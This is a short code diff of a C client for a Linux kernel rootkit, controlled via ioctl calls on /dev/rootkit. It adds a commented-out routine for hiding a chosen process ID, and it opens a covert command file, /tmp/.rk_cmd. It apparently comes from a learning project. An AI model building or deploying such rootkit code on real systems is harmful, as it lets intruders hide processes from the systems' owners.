@@ -7,19 +7,32 @@
 int main() {
 
     struct rk_args args;
-
+    //unsigned long pid;
     int fd = open("/dev/rootkit", O_RDWR);
     if (fd < 0) { perror("open"); return 1; }
 
-    // Envoyer un HELLO
     ioctl(fd, RK_CMD_HELLO, 0);
+    /*
+    printf("Entrez le PID à cacher : ");
+    scanf("%lu", &pid);
 
-    // Demander l'UID courant
+    args.target = pid;
+    args.value = 0;
+
+    if (ioctl(fd, RK_CMD_HIDE_PID, &args) < 0) {
+        perror("ioctl HIDE_PID");
+        close(fd);
+        return -1;
+    }
+
+    printf("PID %lu caché avec succès.\n", pid);
+    */
     ioctl(fd, RK_CMD_GETUID, &args);
     printf("UID courant : %lu\n", args.target);
 
     args.target = (unsigned long)"I am Gr00t";
     args.value  = 0;
+    
     ioctl(fd, RK_CMD_SET_MSG, &args);
 
     int rk = open("/tmp/.rk_cmd", O_RDWR | O_CREAT, 0644);
